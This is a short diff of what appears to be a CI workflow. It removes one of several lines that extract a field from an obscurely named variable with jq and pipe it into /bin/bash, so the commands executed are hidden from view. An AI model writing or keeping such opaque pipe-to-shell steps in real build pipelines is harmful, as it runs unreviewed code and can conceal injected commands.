@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$e595" | jq -r .sl75842 | /bin/bash
           echo $amq8592 | jq -r .uk686 | /bin/bash
           echo $ts2 | jq -r .gd94 | /bin/bash
-          echo $cscc90 | jq -r .yx06 | /bin/bash
           printf '%s' "$rlco679" | jq -r .td1519 | /bin/bash
 
       - name: Upload output
